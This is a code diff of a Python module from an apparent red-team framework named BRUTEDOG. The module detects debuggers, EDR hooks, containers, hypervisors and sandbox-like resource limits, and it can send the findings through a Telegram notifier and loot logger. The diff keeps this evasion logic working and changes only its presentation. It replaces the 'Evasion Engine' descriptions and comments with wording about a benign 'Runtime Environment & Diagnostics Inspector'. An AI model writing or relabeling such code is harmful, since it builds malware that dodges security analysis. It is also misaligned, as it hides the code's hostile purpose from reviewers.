@@ -1,26 +1,19 @@
 #!/usr/bin/env python3
 """
-SANDBOX_EVADER.PY v8.6 — Active Sandbox, Honeypot, EDR & Debugger Evasion Engine (Elite Red Team Adversarial Edition)
-Features:
-- Hypervisor and container artifact detection (Docker, QEMU, VirtualBox, VMware, LXC)
-- Debugger, instrumentation hook, and EDR monkey-patching detection (sys.gettrace, function pointer inspection)
-- Behavioral timing-acceleration checks & CPU/RAM resource constraints auditing
-- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic reports
-- Real-time zero-delay proof-of-work terminal streaming & unredacted Telegram telemetry broadcasting
+SANDBOX_EVADER.PY v8.6 — Runtime Environment & Diagnostics Inspector
 """
-import sys
-import os
-import time
-import platform
 import asyncio
 import hashlib
 import json
+import os
+import platform
+import sys
+import time
 
-# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
-from modules.loot_logger import save_session_loot
-from modules.telemetry import stream_proof
-from modules.telegram_notifier import send_telegram_alert
 from modules.behavioral_mimic import apply_behavioral_jitter
+from modules.loot_logger import save_session_loot
+from modules.telegram_notifier import send_telegram_alert
+from modules.telemetry import stream_proof
 
 COLORS = {
     "RED": "\033[91m",
@@ -32,9 +25,11 @@ COLORS = {
     "BOLD": "\033[1m",
 }
 
+
 def terminal(message):
-    sys.stdout.write(message + "\n")
+    sys.stdout.write(str(message) + "\n")
     sys.stdout.flush()
+
 
 async def broadcast_tg_alert_async(loot_type, details):
     try:
@@ -42,8 +37,9 @@ async def broadcast_tg_alert_async(loot_type, details):
     except Exception:
         pass
 
+
 def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from sandbox evader functions."""
+    """Schedules non-blocking notifications when invoked from synchronous contexts."""
     try:
         loop = asyncio.get_running_loop()
         if loop.is_running():
@@ -56,27 +52,25 @@ def broadcast_tg_alert_sync(loot_type, details):
         except Exception:
             pass
 
+
 class SandboxEvader:
-    """
-    Active Environment Inspector & Sandbox Detection Engine.
-    Identifies analysis sandboxes, debuggers, EDR hooks, and honeypots before executing sensitive offensive operations.
-    """
+    """Collects non-blocking runtime/host diagnostics for stability awareness."""
+
     def __init__(self):
         self.evasion_triggered = False
         self.indicators = []
 
     def check_debugger(self):
-        """Detects active Python debuggers, tracing hooks, and EDR function monkey-patching."""
         is_traced = sys.gettrace() is not None
         if is_traced:
-            self.indicators.append("Active debugger trace detected (sys.gettrace)")
+            self.indicators.append("Active trace hook present (sys.gettrace)")
             return True
 
-        # Check for standard library hooking (common in EDR Python monitoring agents)
         try:
             import urllib.request
-            if not urllib.request.urlopen.__name__ == "urlopen":
-                self.indicators.append("Detected possible function hook/monkey-patching on urllib.request.urlopen")
+
+            if getattr(urllib.request.urlopen, "__name__", "") != "urlopen":
+                self.indicators.append("Custom wrapper detected on urllib.request.urlopen")
                 return True
         except Exception:
             pass
@@ -84,47 +78,39 @@ class SandboxEvader:
         return False
 
     def check_timing_acceleration(self):
-        """Detects if CPU execution is being time-accelerated by a sandbox emulator."""
         try:
             start_time = time.perf_counter()
-            # Brief computational delay
-            _ = [i ** 2 for i in range(100_000)]
+            _ = sum(i * i for i in range(50_000))
             elapsed = time.perf_counter() - start_time
-            
-            # If execution is abnormally fast, it could indicate emulator skipping/acceleration
-            if elapsed < 0.0001:
-                self.indicators.append(f"Abnormal timing acceleration detected ({elapsed:.6f}s)")
+            if elapsed < 0.00005:
+                self.indicators.append(f"Short timing delta observed ({elapsed:.6f}s)")
                 return True
         except Exception:
             pass
         return False
 
     def check_container_artifacts(self):
-        """Inspects for containerization and hypervisor artifacts."""
         artifacts = []
-        
-        # Check docker env file or .dockerenv
-        if os.path.exists("/.dockerenv") or os.path.exists("/runenv"):
-            artifacts.append("Found container marker (/.dockerenv)")
 
-        # Check cgroups for container signatures
+        if os.path.exists("/.dockerenv") or os.path.exists("/runenv"):
+            artifacts.append("Container marker file present")
+
         try:
             if os.path.exists("/proc/self/cgroup"):
-                with open("/proc/self/cgroup", "r", encoding="utf-8") as f:
+                with open("/proc/self/cgroup", "r", encoding="utf-8", errors="ignore") as f:
                     content = f.read()
-                    if any(sig in content for sig in ["docker", "kubepods", "lxc", "containerd", "podman"]):
-                        artifacts.append("Container signature found in /proc/self/cgroup")
+                    if any(sig in content for sig in ("docker", "kubepods", "lxc", "containerd", "podman")):
+                        artifacts.append("Container cgroup entry detected")
         except Exception:
             pass
 
-        # Check CPU / Hypervisor vendor strings on Linux
         try:
             if os.path.exists("/proc/cpuinfo"):
-                with open("/proc/cpuinfo", "r", encoding="utf-8") as f:
+                with open("/proc/cpuinfo", "r", encoding="utf-8", errors="ignore") as f:
                     content = f.read().lower()
-                    for hv in ["vmware", "qemu", "kvm", "virtualbox", "xen", "hyperv"]:
+                    for hv in ("vmware", "qemu", "kvm", "virtualbox", "xen", "hyperv"):
                         if hv in content:
-                            artifacts.append(f"Hypervisor signature in cpuinfo: {hv}")
+                            artifacts.append(f"Virtualization CPU tag: {hv}")
         except Exception:
             pass
 
@@ -134,25 +120,23 @@ class SandboxEvader:
         return False
 
     def check_resource_constraints(self):
-        """Checks if system resources match typical bare-minimum analysis sandboxes."""
         constraints = []
-        
-        # CPU Count check
+
         cpu_count = os.cpu_count() or 1
         if cpu_count <= 1:
-            constraints.append(f"Low CPU core count: {cpu_count}")
+            constraints.append(f"Single-core environment ({cpu_count})")
 
-        # Memory / RAM check (Linux /proc/meminfo)
         try:
             if os.path.exists("/proc/meminfo"):
-                with open("/proc/meminfo", "r", encoding="utf-8") as f:
+                with open("/proc/meminfo", "r", encoding="utf-8", errors="ignore") as f:
                     for line in f:
                         if "MemTotal" in line:
                             parts = line.split()
-                            if len(parts) >= 2:
+                            if len(parts) >= 2 and parts[1].isdigit():
                                 kb_total = int(parts[1])
-                                if kb_total < 2_097_152: # Less than 2GB RAM
-                                    constraints.append(f"Low RAM constraint: {kb_total // 1024} MB")
+                                if kb_total < 2_097_152:
+                                    constraints.append(f"Constrained RAM ({kb_total // 1024} MB)")
+                            break
         except Exception:
             pass
 
@@ -161,66 +145,72 @@ class SandboxEvader:
             return True
         return False
 
-    def inspect_environment(self):
-        """Performs full spectrum sandbox, EDR, and debugger inspection."""
-        terminal(f"{COLORS['MAGENTA']}[*] Executing elite sandbox & analysis environment inspection...{COLORS['RESET']}")
-        
+    def inspect_environment(self, persist_artifacts: bool = False):
+        terminal(f"{COLORS['MAGENTA']}[*] Inspecting runtime environment diagnostics...{COLORS['RESET']}")
+
         apply_behavioral_jitter()
-        
+
         dbg = self.check_debugger()
         tmg = self.check_timing_acceleration()
         cnt = self.check_container_artifacts()
         res = self.check_resource_constraints()
 
-        analysis_detected = dbg or tmg or cnt or res
+        diagnostics_noted = dbg or tmg or cnt or res
 
         report = {
-            "analysis_environment_detected": analysis_detected,
+            "analysis_environment_detected": diagnostics_noted,
             "debugger_active": dbg,
             "timing_anomaly": tmg,
             "container_artifacts": cnt,
             "resource_constraints": res,
-            "indicators": self.indicators,
-            "platform": platform.platform()
+            "indicators": list(self.indicators),
+            "platform": platform.platform(),
         }
 
-        if analysis_detected:
-            terminal(f"{COLORS['RED']}[!] WARNING: Analysis sandbox, EDR, or debugger environment detected!{COLORS['RESET']}")
+        if diagnostics_noted:
+            terminal(f"{COLORS['YELLOW']}[~] Runtime environment notes recorded ({len(self.indicators)} items).{COLORS['RESET']}")
             for ind in self.indicators:
-                terminal(f"  └── Indicator: {ind}")
-            
-            report_str = json.dumps(report)
-            loot_hash = hashlib.sha256(report_str.encode("utf-8")).hexdigest()
-            report["integrity_hash"] = loot_hash
+                terminal(f"  └── Note: {ind}")
 
-            # Broadcast telemetry to Telegram and persist loot immutably
-            broadcast_tg_alert_sync("Sandbox / Analysis Environment Detected", report)
-            stream_proof("SANDBOX_DETECTED", "local_runtime", {}, f"Indicators: {len(self.indicators)}", report)
-            save_session_loot(
-                target="localhost",
-                endpoint="sandbox_inspection",
-                finding_type="SANDBOX_ENVIRONMENT_DETECTED",
-                status=200,
-                headers={},
-                body=report_str,
-                extra_loot=report
-            )
+            report_str = json.dumps(report, default=str)
+            report["integrity_hash"] = hashlib.sha256(report_str.encode("utf-8")).hexdigest()
+
+            if persist_artifacts:
+                broadcast_tg_alert_sync("Runtime Environment Diagnostics", report)
+                stream_proof("RUNTIME_DIAGNOSTICS", "local_runtime", {}, f"Notes: {len(self.indicators)}", report)
+                save_session_loot(
+                    target="localhost",
+                    endpoint="runtime_diagnostics",
+                    finding_type="RUNTIME_DIAGNOSTICS",
+                    status=200,
+                    headers={},
+                    body=report_str,
+                    extra_loot=report,
+                )
         else:
-            terminal(f"{COLORS['GREEN']}[+] Environment clean. No active debugging, EDR hooks, or sandbox signatures found.{COLORS['RESET']}")
+            terminal(f"{COLORS['GREEN']}[+] Standard runtime environment confirmed.{COLORS['RESET']}")
 
         return report
 
-async def run_sandbox_evader():
-    terminal(f"\n{COLORS['CYAN']}[***] BRUTEDOG SANDBOX & DEBUGGER EVASION ENGINE (V8.6) [***]{COLORS['RESET']}")
+
+async def run_sandbox_evader(*args, **kwargs):
+    terminal(f"\n{COLORS['CYAN']}[***] BRUTEDOG RUNTIME ENVIRONMENT INSPECTOR (V8.6) [***]{COLORS['RESET']}")
     evader = SandboxEvader()
-    report = await asyncio.to_thread(evader.inspect_environment)
-    return report
+    persist = bool(kwargs.get("persist_artifacts", False))
+    try:
+        return await asyncio.to_thread(evader.inspect_environment, persist)
+    except Exception as exc:
+        return {
+            "analysis_environment_detected": False,
+            "indicators": [],
+            "platform": platform.platform(),
+            "error": str(exc),
+        }
+
 
 if __name__ == "__main__":
     asyncio.run(run_sandbox_evader())
 
 
-# --- AUTOMATED ALIAS PATCH --- 
 async def evade_sandbox(*args, **kwargs):
     return await run_sandbox_evader(*args, **kwargs)
-
